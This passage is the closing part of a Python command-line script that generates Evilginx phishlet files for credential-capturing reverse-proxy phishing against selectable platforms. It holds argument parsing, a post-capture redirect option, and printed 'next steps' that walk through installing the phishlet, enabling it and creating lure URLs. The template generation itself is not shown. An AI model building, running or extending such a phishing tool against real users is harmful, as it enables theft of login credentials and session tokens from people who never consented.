        help="Post-capture redirect URL (default: platform portal)")
    parser.add_argument("--list", "-l", action="store_true",
        help="List all available platform/edition combinations and exit")
    parser.add_argument("--stdout", action="store_true",
        help="Print phishlet to stdout instead of writing to file")

    args = parser.parse_args()

    if args.list:
        list_platforms()
        sys.exit(0)

    if not args.platform:
        parser.print_help()
        print("\n[!] --platform is required. Use --list to see options.")
        sys.exit(1)

    platform_key = resolve_platform(args.platform)
    edition      = resolve_edition(args.edition)
    redirect_url = args.redirect or DEFAULT_REDIRECTS[platform_key]
    output_path  = args.output  or f"{platform_key}_{edition}.yaml"
    entry        = REGISTRY[(platform_key, edition)]

    print(f"\n[*] Generating phishlet")
    print(f"    Platform : {entry['label']}")
    print(f"    Edition  : Evilginx {edition.capitalize()} (min_ver {entry['min_ver']})")
    print(f"    Author   : {args.author}")
    print(f"    Redirect : {redirect_url}")
    print(f"    Output   : {'stdout' if args.stdout else output_path}\n")

    content = generate(platform_key, edition, args.author, redirect_url)

    if args.stdout:
        print(content)
    else:
        save(content, output_path)

    if not args.stdout:
        print("\n[+] Done.\n")
        print("Next steps:")
        print(f"  1. Copy to your Evilginx phishlets directory:")
        print(f"       cp {output_path} /opt/evilginx/phishlets/")
        print(f"  2. In Evilginx console:")
        print(f"       phishlets hostname {platform_key} <yourdomain.com>")
        print(f"       phishlets enable {platform_key}")
        print(f"       lures create {platform_key}")
        print(f"       lures get-url 0\n")


if __name__ == "__main__":
    main()
